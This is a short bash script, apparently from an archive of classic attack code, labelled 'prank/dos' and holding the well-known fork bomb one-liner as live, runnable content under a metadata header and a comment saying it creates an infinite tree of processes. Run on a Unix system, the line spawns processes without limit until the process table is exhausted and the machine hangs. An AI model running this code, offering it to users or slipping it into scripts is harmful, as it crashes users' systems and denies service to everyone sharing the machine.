#!/usr/bin/env bash
# ------------------------------------------------------------
# name      Fork Bomb
# type      prank/dos
# cve       —
# year      —
# os        unix
# authors   unknown
# source    http://askubuntu.com/questions/159491
# archived  krisyotam
# notes     exponential process spawn; exhausts OS process table
# ------------------------------------------------------------

# Classic bash fork bomb. Creates an infinite tree of processes.
# Source: http://askubuntu.com/questions/159491
:(){ :|:& };:
